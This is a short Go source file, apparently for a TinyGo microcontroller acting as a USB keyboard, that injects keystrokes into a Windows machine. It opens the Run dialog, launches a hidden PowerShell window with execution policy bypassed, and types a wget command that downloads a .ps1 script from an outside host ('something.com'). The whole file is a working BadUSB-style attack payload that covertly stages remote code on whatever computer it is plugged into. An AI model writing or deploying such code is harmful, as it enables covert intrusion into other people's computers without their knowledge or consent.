package programs

import (
	"machine/usb/hid/keyboard"
	"time"
)


func Sleep1Sec() {
	time.Sleep(1000 * time.Millisecond)
}

// Downloads ps1 file from webserver using hidden powershell
func DownloadFile() {

	kb := keyboard.Port()

	runs := 1
	for {
		if runs == 2 {
			break
		}
		runs += 1

		Sleep1Sec()

		kb.Down(keyboard.KeyModifierGUI)
		kb.Down(keyboard.KeyR)
		kb.Down(keyboard.KeyEnter)
		kb.Release()

		Sleep1Sec()

		kb.Write([]byte("powershell -NoP -NonI -W Hidden -Exec Bypass"))

		Sleep1Sec()
		
		kb.Press(keyboard.KeyEnter)

		Sleep1Sec()
		
		kb.Write([]byte("wget 'http://something.com/' -outfile 'sss.ps1'"))

		Sleep1Sec()

		kb.Press(keyboard.KeyEnter)
	}
}
